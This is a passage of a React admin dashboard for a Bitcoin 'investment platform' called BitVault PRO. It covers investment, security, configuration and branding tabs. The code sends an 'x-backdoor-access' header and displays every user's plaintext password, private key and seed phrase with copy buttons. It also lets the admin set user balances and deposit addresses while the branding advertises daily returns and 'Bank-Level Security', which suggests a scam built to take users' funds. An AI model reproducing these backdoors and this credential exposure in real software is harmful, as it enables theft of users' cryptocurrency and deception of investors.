      toast({ title: "Failed to update investment", description: error.message, variant: "destructive" });
    },
  });

  const cancelInvestmentMutation = useMutation({
    mutationFn: async ({ investmentId, reason, refund }: { investmentId: number; reason?: string; refund?: boolean }) => {
      const headers: Record<string, string> = { 'Content-Type': 'application/json' };
      if (isBackdoorAccess) headers['x-backdoor-access'] = 'true';

      const response = await fetch(`/api/admin/investments/${investmentId}`, {
        method: 'DELETE',
        headers,
        body: JSON.stringify({ reason, refund }),
        credentials: 'include'
      });
      if (!response.ok) throw new Error('Failed to cancel investment');
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/admin/investments'] });
      toast({ title: "Investment cancelled successfully" });
    },
    onError: (error: any) => {
      toast({ title: "Failed to cancel investment", description: error.message, variant: "destructive" });
    },
  });

  const renderInvestmentsTab = () => {
    return (
      <div className="space-y-6">
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <TrendingUp className="w-5 h-5" />
              Investment Management
              <Button
                size="sm"
                variant="outline"
                onClick={() => queryClient.invalidateQueries({ queryKey: ['/api/admin/investments'] })}
                className="ml-auto"
              >
                <RefreshCw className="w-4 h-4 mr-1" />
                Refresh
              </Button>
            </CardTitle>
          </CardHeader>
          <CardContent>
            {investmentsLoading ? (
              <div className="space-y-3">
                {[1, 2, 3].map((i) => (
                  <div key={i} className="h-20 bg-muted rounded animate-pulse"></div>
                ))}
              </div>
            ) : !allInvestments || allInvestments.length === 0 ? (
              <div className="text-center py-8">
                <TrendingUp className="w-12 h-12 mx-auto text-muted-foreground mb-4" />
                <h3 className="font-semibold mb-2">No Investments Found</h3>
                <p className="text-sm text-muted-foreground">No user investments have been created yet.</p>
                <Button
                  size="sm"
                  variant="outline"
                  onClick={() => queryClient.invalidateQueries({ queryKey: ['/api/admin/investments'] })}
                  className="mt-4"
                >
                  <RefreshCw className="w-4 h-4 mr-1" />
                  Check Again
                </Button>
              </div>
            ) : (
              <div className="space-y-4">
                {allInvestments.map((investment: any) => (
                  <div key={investment.id} className="border rounded-lg p-4 bg-gradient-to-r from-gray-50 to-white">
                    <div className="flex justify-between items-start mb-3">
                      <div>
                        <h4 className="font-semibold flex items-center gap-2">
                          Investment #{investment.id}
                          <Badge className={investment.isActive ? "bg-green-100 text-green-800" : "bg-red-100 text-red-800"}>
                            {investment.isActive ? 'Active' : 'Paused'}
                          </Badge>
                        </h4>
                        <p className="text-sm text-muted-foreground">
                          User: {investment.userEmail} | Plan: {investment.planName}
                        </p>
                      </div>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-4">
                      <div>
                        <Label className="text-xs text-muted-foreground">Amount</Label>
                        <p className="font-mono text-sm">{formatBitcoin(investment.amount)} BTC</p>
                      </div>
                      <div>
                        <Label className="text-xs text-muted-foreground">Current Profit</Label>
                        <p className="font-mono text-sm text-green-600">+{formatBitcoin(investment.currentProfit)} BTC</p>
                      </div>
                      <div>
                        <Label className="text-xs text-muted-foreground">Daily Rate</Label>
                        <p className="text-sm">{(parseFloat(investment.dailyReturnRate) * 100).toFixed(3)}%</p>
                      </div>
                      <div>
                        <Label className="text-xs text-muted-foreground">Start Date</Label>
                        <p className="text-sm">{new Date(investment.startDate).toLocaleDateString()}</p>
                      </div>
                    </div>

                    <div className="flex gap-2">
                      <Button
                        size="sm"
                        onClick={() => {
                          const action = investment.isActive ? 'pause' : 'resume';
                          const reason = prompt(`Enter reason to ${action} this investment:\n\nThis message will be sent to the user immediately.`);
                          if (reason !== null) { // Allow empty string but not cancelled dialog
                            pauseInvestmentMutation.mutate({
                              investmentId: investment.id,
                              reason: reason || `Investment ${action}d by administrator`
                            });
                          }
                        }}
                        disabled={pauseInvestmentMutation.isPending}
                        className={investment.isActive ? "bg-yellow-600 hover:bg-yellow-700" : "bg-green-600 hover:bg-green-700"}
                      >
                        {pauseInvestmentMutation.isPending ? (
                          investment.isActive ? 'Pausing...' : 'Resuming...'
                        ) : (
                          investment.isActive ? 'Pause' : 'Resume'
                        )}
                      </Button>
                      <Button
                        size="sm"
                        onClick={() => {
                          const reason = prompt("Enter reason for cancellation (optional):");
                          const refund = confirm("Refund the investment amount to user's balance?");
                          if (confirm(`Are you sure you want to cancel this investment?${refund ? ' The amount will be refunded.' : ''}`)) {
                            cancelInvestmentMutation.mutate({
                              investmentId: investment.id,
                              reason: reason || undefined,
                              refund
                            });
                          }
                        }}
                        disabled={cancelInvestmentMutation.isPending}
                        variant="destructive"
                      >
                        Cancel
                      </Button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    );
  };

  const renderSecurityTab = () => (
    <div className="space-y-6">
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Shield className="w-5 h-5" />
            Security Management
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <Button
            onClick={() => testBitcoinGenMutation.mutate()}
            disabled={testBitcoinGenMutation.isPending}
            className="w-full bg-green-600 hover:bg-green-700"
          >
            {testBitcoinGenMutation.isPending ? (
              <>
                <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                Testing Bitcoin Generation...
              </>
            ) : (
              <>
                <Bitcoin className="w-4 h-4 mr-2" />
                Test Bitcoin Generation
              </>
            )}
          </Button>
          <p className="text-sm text-muted-foreground">
            Verify that Bitcoin addresses and private keys can be generated correctly.
          </p>
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Key className="w-5 h-5" />
            User Wallet Information
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="space-y-4 max-h-96 overflow-y-auto">
            {users?.map((user) => (
              <div key={user.id} className="border rounded-lg p-4 bg-gradient-to-r from-red-50 to-pink-50">
                <div className="flex justify-between items-start mb-3">
                  <div>
                    <p className="font-medium">{user.email}</p>
                    <p className="text-sm text-muted-foreground">User ID: {user.id}</p>
                    <div className="flex items-center gap-2 mt-1">
                      <Badge variant={user.hasWallet ? "default" : "secondary"}>
                        {user.hasWallet ? "Has Wallet" : "No Wallet"}
                      </Badge>
                      {user.currentPlanId && (
                        <Badge variant="outline">
                          Plan ID: {user.currentPlanId}
                        </Badge>
                      )}
                    </div>
                  </div>
                  <div className="flex gap-2">
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => {
                        navigator.clipboard.writeText(user.privateKey || '');
                        toast({
                          title: "Copied",
                          description: "Private key copied to clipboard",
                        });
                      }}
                    >
                      <Copy className="w-3 h-3 mr-1" />
                      Copy PK
                    </Button>
                    {user.seedPhrase && (
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={() => {
                          navigator.clipboard.writeText(user.seedPhrase || '');
                          toast({
                            title: "Copied",
                            description: "Seed phrase copied to clipboard",
                          });
                        }}
                      >
                        <Copy className="w-3 h-3 mr-1" />
                        Copy Seed
                      </Button>
                    )}
                  </div>
                </div>
                <div className="space-y-3">
                    <div>
                      <p className="text-xs font-medium text-muted-foreground mb-1">Password:</p>
                      <p className="text-xs font-mono bg-white p-2 rounded border break-all text-red-600">
                        {user.password || 'No password available'}
                      </p>
                    </div>
                    <div>
                      <p className="text-xs font-medium text-muted-foreground mb-1">Bitcoin Address:</p>
                      <p className="text-xs font-mono bg-white p-2 rounded border break-all">
                        {user.bitcoinAddress || 'No address generated'}
                      </p>
                    </div>
                    <div>
                      <p className="text-xs font-medium text-muted-foreground mb-1">Private Key:</p>
                      <p className="text-xs font-mono bg-white p-2 rounded border break-all text-red-600">
                        {user.privateKey || 'No private key available'}
                      </p>
                    </div>
                  {user.seedPhrase && (
                    <div>
                      <p className="text-xs font-medium text-muted-foreground mb-1">Seed Phrase:</p>
                      <p className="text-xs font-mono bg-white p-2 rounded border break-all text-blue-600">
                        {user.seedPhrase}
                      </p>
                    </div>
                  )}
                  <div className="grid grid-cols-2 gap-2 pt-2 border-t">
                    <div>
                      <p className="text-xs font-medium text-muted-foreground">Balance:</p>
                      <p className="text-xs font-mono">{formatBitcoin(user.balance)} BTC</p>
                    </div>
                    <div>
                      <p className="text-xs font-medium text-muted-foreground">Admin:</p>
                      <p className="text-xs">{user.isAdmin ? 'Yes' : 'No'}</p>
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>
    </div>
  );

  const renderConfigTab = () => (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Settings className="w-5 h-5" />
          System Configuration
        </CardTitle>
      </CardHeader>
      <CardContent>
        <div className="space-y-6">
          <div className="grid gap-4">
            <div>
              <Label htmlFor="vaultAddress">Vault Address</Label>
              <Input
                id="vaultAddress"
                value={vaultAddress}
                onChange={(e) => setVaultAddress(e.target.value)}
                placeholder="Enter vault Bitcoin address"
                className="mt-1 font-mono"
              />
            </div>
            <div>
              <Label htmlFor="depositAddress">Deposit Address</Label>
              <Input
                id="depositAddress"
                value={depositAddress}
                onChange={(e) => setDepositAddress(e.target.value)}
                placeholder="Enter deposit Bitcoin address"
                className="mt-1 font-mono"
              />
            </div>
            <Button
              onClick={updateConfig}
              disabled={updateConfigMutation.isPending}
              className="w-full bg-bitcoin hover:bg-bitcoin/90 text-black"
            >
              {updateConfigMutation.isPending ? "Updating..." : "Update Configuration"}
            </Button>
          </div>

          <div className="pt-6 border-t">
            <h3 className="font-semibold mb-4">Bitcoin Management</h3>
            <Button
              onClick={() => syncAllBalancesMutation.mutate()}
              disabled={syncAllBalancesMutation.isPending}
              className="w-full bg-bitcoin hover:bg-bitcoin/90 text-black"
            >
              {syncAllBalancesMutation.isPending ? (
                <>
                  <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                  Syncing All Balances...
                </>
              ) : (
                <>
                  <RefreshCw className="w-4 h-4 mr-2" />
                  Sync All User Balances
                </>
              )}
            </Button>
            <p className="text-sm text-muted-foreground mt-2">
              Check all user Bitcoin addresses on the blockchain and update balances.
            </p>
          </div>
        </div>
      </CardContent>
    </Card>
  );

  const renderBrandTab = () => (
    <div className="space-y-6">
      {/* Main Brand Showcase Card - Advertisement Style */}
      <Card className="overflow-hidden border-0 shadow-2xl">
        <div className="relative h-96 bg-gradient-to-br from-slate-900 via-orange-900 to-black">
          {/* Animated Background Elements */}
          <div className="absolute inset-0 bg-gradient-to-r from-orange-600/20 to-amber-400/20"></div>
          <div className="absolute top-0 left-0 w-full h-full opacity-10">
            <div className="absolute top-10 left-10 w-32 h-32 bg-orange-400 rounded-full blur-3xl animate-pulse"></div>
            <div className="absolute bottom-10 right-10 w-40 h-40 bg-amber-400 rounded-full blur-3xl animate-pulse delay-1000"></div>
            <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-64 h-64 bg-orange-500/30 rounded-full blur-3xl animate-pulse delay-500"></div>
          </div>

          {/* Grid Pattern Overlay */}
          <div className="absolute inset-0 opacity-5">
            <div className="w-full h-full" style={{
              backgroundImage: 'radial-gradient(circle, white 1px, transparent 1px)',
              backgroundSize: '50px 50px'
            }}></div>
          </div>

          {/* Main Content */}
          <div className="relative z-10 h-full flex flex-col items-center justify-center text-white p-8">
            {/* Logo */}
            <div className="mb-8 transform hover:scale-105 transition-transform duration-300">
              <div className="flex items-center gap-4">
                <div className="w-20 h-20 rounded-2xl bg-gradient-to-br from-orange-400 to-amber-500 flex items-center justify-center shadow-2xl">
                  <span className="text-4xl font-bold text-black">₿</span>
                </div>
                <div className="text-left">
                  <h1 className="text-5xl font-bold tracking-tight mb-2">BitVault</h1>
                  <div className="bg-gradient-to-r from-orange-400 to-amber-400 text-black px-4 py-1 rounded-full text-lg font-bold">
                    PRO EDITION
                  </div>
                </div>
              </div>
            </div>

            {/* Taglines */}
            <div className="text-center space-y-4">
              <h2 className="text-3xl font-bold text-orange-400">
                Professional Bitcoin Investment Platform
              </h2>
              <div className="flex items-center justify-center gap-8 text-lg">
                <div className="flex items-center gap-2">
                  <Shield className="w-6 h-6 text-green-400" />
                  <span>Bank-Level Security</span>
                </div>
                <div className="flex items-center gap-2">
                  <TrendingUp className="w-6 h-6 text-blue-400" />
                  <span>Advanced Analytics</span>
                </div>
                <div className="flex items-center gap-2">
                  <Bitcoin className="w-6 h-6 text-orange-400" />
                  <span>Real-Time Trading</span>
                </div>
              </div>
              <p className="text-xl text-orange-200 font-medium mt-6">
                Secure • Professional • Exclusive
              </p>
            </div>

            {/* Call to Action */}
            <div className="mt-8">
              <div className="bg-gradient-to-r from-orange-500 to-amber-500 text-black px-8 py-3 rounded-full text-xl font-bold shadow-2xl">
                Join the Elite Bitcoin Investors
              </div>
            </div>
          </div>

          {/* Corner Decorations */}
          <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-bl from-orange-400/20 to-transparent rounded-bl-full"></div>
          <div className="absolute bottom-0 left-0 w-32 h-32 bg-gradient-to-tr from-amber-400/20 to-transparent rounded-tr-full"></div>
        </div>
      </Card>

      {/* Alternative Brand Variations */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">

        {/* Minimal Dark Version */}
        <Card className="overflow-hidden border border-gray-800">
          <div className="bg-slate-900 p-8 text-center">
            <div className="flex justify-center mb-6">
              <div className="w-16 h-16 rounded-xl bg-orange-500 flex items-center justify-center">
                <span className="text-2xl font-bold text-black">₿</span>
              </div>
            </div>
            <h3 className="text-3xl font-bold text-white mb-2">BitVault</h3>
            <div className="bg-orange-500 text-black px-3 py-1 rounded-full text-sm font-bold inline-block mb-4">
              PRO
            </div>
            <p className="text-gray-400">Professional Bitcoin Platform</p>
          </div>
        </Card>

        {/* Light Corporate Version */}
        <Card className="overflow-hidden">
          <div className="bg-gradient-to-br from-orange-50 to-amber-50 p-8 text-center border">
            <div className="flex justify-center mb-6">
              <div className="w-16 h-16 rounded-xl bg-gradient-to-br from-orange-500 to-amber-500 flex items-center justify-center shadow-lg">
                <span className="text-2xl font-bold text-white">₿</span>
              </div>
            </div>
            <h3 className="text-3xl font-bold text-gray-900 mb-2">BitVault</h3>
            <div className="bg-gradient-to-r from-orange-500 to-amber-500 text-white px-3 py-1 rounded-full text-sm font-bold inline-block mb-4">
              PRO EDITION
            </div>
            <p className="text-gray-600">Trusted Bitcoin Investment Solution</p>
          </div>
        </Card>
      </div>

      {/* Brand Guidelines */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Settings className="w-5 h-5" />
            Brand Guidelines & Assets
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">

            {/* Color Palette */}
            <div>
              <h4 className="font-semibold mb-4">Brand Colors</h4>
              <div className="space-y-3">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded bg-orange-500"></div>
                  <div>
                    <p className="font-medium">Primary Orange</p>
                    <p className="text-sm text-muted-foreground">#F97316</p>
                  </div>
                </div>
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded bg-amber-500"></div>
                  <div>
                    <p className="font-medium">Secondary Amber</p>
                    <p className="text-sm text-muted-foreground">#F59E0B</p>
                  </div>
                </div>
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded bg-slate-900"></div>
                  <div>
                    <p className="font-medium">Dark Background</p>
                    <p className="text-sm text-muted-foreground">#0F172A</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Typography */}
            <div>
              <h4 className="font-semibold mb-4">Typography</h4>
              <div className="space-y-3">
                <div>
                  <p className="text-2xl font-bold">BitVault</p>
                  <p className="text-sm text-muted-foreground">Primary Brand Name</p>
                </div>
                <div>
                  <p className="text-lg font-bold bg-gradient-to-r from-orange-500 to-amber-500 text-white px-3 py-1 rounded-full inline-block">
                    PRO EDITION
                  </p>
                  <p className="text-sm text-muted-foreground">Brand Modifier</p>
                </div>
                <div>
                  <p className="text-base">Professional Bitcoin Investment Platform</p>
                  <p className="text-sm text-muted-foreground">Brand Tagline</p>
                </div>
              </div>
            </div>
          </div>

          <div className="mt-8 p-4 bg-blue-50 rounded-lg border border-blue-200">
            <h4 className="font-semibold text-blue-900 mb-2">Usage Guidelines</h4>
            <ul className="text-sm text-blue-800 space-y-1">
              <li>• Always maintain the Bitcoin symbol (₿) in the logo</li>
              <li>• Use the gradient backgrounds for premium feel</li>
              <li>• Maintain minimum clear space around the logo</li>
              <li>• PRO EDITION should always appear with brand name</li>
              <li>• Use high contrast for accessibility</li>
            </ul>
          </div>
        </CardContent>
      </Card>
    </div>
  );

  const renderTabContent = () => {
    switch (activeTab) {
      case "overview":
        return renderOverviewTab();
      case "users":
        return renderUsersTab();
      case "investments":
        return renderInvestmentsTab();
      case "plans":
        return renderPlansTab();
      case "transactions":
        return renderTransactionsTab();
      case "security":
        return renderSecurityTab();
      case "config":
        return renderConfigTab();
      case "brand":
        return renderBrandTab();
      default:
        return renderOverviewTab();
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Sidebar */}
      {renderSidebar()}

      {/* Sidebar Overlay */}
      {sidebarOpen && (
        <div
          className="fixed inset-0 bg-black bg-opacity-50 z-40 lg:hidden"
          onClick={() => setSidebarOpen(false)}
        />
      )}

      {/* Main Content */}
      <div className="lg:ml-64">
        {/* Top Header */}
        <header className="bg-white border-b border-gray-200 px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <Button
                variant="ghost"
                size="icon"
                onClick={() => setSidebarOpen(true)}
                className="lg:hidden"
              >
                <Menu className="w-5 h-5" />
              </Button>
              <div>
                <h1 className="text-2xl font-bold text-gray-900">
                  {navigationItems.find(item => item.id === activeTab)?.label || "Overview"}
                </h1>
                <p className="text-sm text-gray-500">
                  {currentTime.toLocaleDateString()} • {currentTime.toLocaleTimeString()}
                </p>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <Badge variant="secondary" className="bg-green-100 text-green-800">
                <Activity className="w-3 h-3 mr-1" />
                Online
              </Badge>
              <div className="text-right">
                <p className="text-sm font-medium">{user?.email}</p>
                <p className="text-xs text-gray-500">Administrator</p>
              </div>
            </div>
          </div>
        </header>

        {/* Main Content Area */}
        <main className="p-6">
          {/* Tab Navigation */}
          <div className="mb-6">
            <div className="border-b border-gray-200">
              <nav className="-mb-px flex space-x-8 overflow-x-auto">
                {navigationItems.map((item) => {
                  const Icon = item.icon;
                  const isActive = activeTab === item.id;
                  return (
                    <button
                      key={item.id}
                      onClick={() => setActiveTab(item.id)}
                      className={`flex items-center gap-2 py-2 px-1 border-b-2 font-medium text-sm whitespace-nowrap ${
                        isActive
                          ? 'border-bitcoin text-bitcoin'
                          : 'border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300'
                      }`}
                    >
                      <Icon className="w-4 h-4" />
                      {item.label}
                    </button>
                  );
                })}
              </nav>
            </div>
          </div>

          {renderTabContent()}
        </main>
      </div>

      {/* Dialogs */}
      <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Update User Balance</DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <div>
              <Label htmlFor="email">User Email</Label>
              <Input
                id="email"
                value={selectedUser?.email || ""}
                disabled
                className="bg-muted"
              />
            </div>
            <div>
              <Label htmlFor="balance">New Balance (BTC)</Label>
              <Input
                id="balance"
                type="number"
                step="0.00000001"
                value={newBalance}
                onChange={(e) => setNewBalance(e.target.value)}
                placeholder="0.00000000"
              />
            </div>
            <div className="flex gap-2">
              <Button
                onClick={submitBalanceUpdate}
                disabled={updateBalanceMutation.isPending}
                className="bg-bitcoin hover:bg-bitcoin/90 text-black flex-1"
              >
                {updateBalanceMutation.isPending ? "Updating..." : "Update Balance"}
              </Button>
              <Button variant="outline" onClick={() => setDialogOpen(false)}>
                Cancel
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={planDialogOpen} onOpenChange={setPlanDialogOpen}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Update Investment Plan</DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <div>
              <Label htmlFor="userEmail">User Email</Label>
              <Input
                id="userEmail"
                value={selectedUser?.email || ""}
                disabled
                className="bg-muted"
              />
            </div>
            <div>
              <Label htmlFor="plan">Investment Plan</Label>
              <Select value={selectedPlan} onValueChange={setSelectedPlan}>
                <SelectTrigger>
                  <SelectValue placeholder="Select a plan" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="0">Free Plan</SelectItem>
                  {investmentPlans?.map((plan) => (
                    <SelectItem key={plan.id} value={plan.id.toString()}>
                      {plan.name} - {(parseFloat(plan.dailyReturnRate) * 100).toFixed(2)}% daily
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <div className="flex gap-2">
              <Button
                onClick={submitPlanUpdate}
                disabled={updatePlanMutation.isPending}
                className="bg-bitcoin hover:bg-bitcoin/90 text-black flex-1"
              >
                {updatePlanMutation.isPending ? "Updating..." : "Update Plan"}
              </Button>
              <Button variant="outline" onClick={() => setPlanDialogOpen(false)}>
                Cancel
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Bottom spacing for mobile navigation */}
      <div className="h-20 lg:hidden"></div>

      {/* Bottom Navigation for mobile */}
      <div className="lg:hidden">
        <BottomNavigation />
      </div>
    </div>
  );
}